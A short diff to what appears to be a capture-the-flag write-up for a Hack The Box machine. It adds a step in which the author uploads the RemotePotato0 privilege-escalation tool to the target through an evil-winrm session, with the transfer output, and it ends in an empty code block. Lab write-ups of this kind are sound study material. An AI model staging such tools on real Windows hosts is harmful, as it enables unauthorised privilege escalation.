@@ -592,7 +592,20 @@ To exploit this ill try remote potato
 
 https://github.com/antonioCoco/RemotePotato0
 
+Ill install the newest release off github
 
+```python
+evil-winrm-py PS C:\Temp> upload RemotePotato0.exe .
+Uploading /home/kali/htb/mirage/RemotePotato0.exe: 192kB [00:00, 534kB/s]                                    
+[+] File uploaded successfully as: C:\Temp\RemotePotato0.exe
+evil-winrm-py PS C:\Temp>
+```
+
+Then ill upload it to the target
+
+```python
+
+```
 
 
 
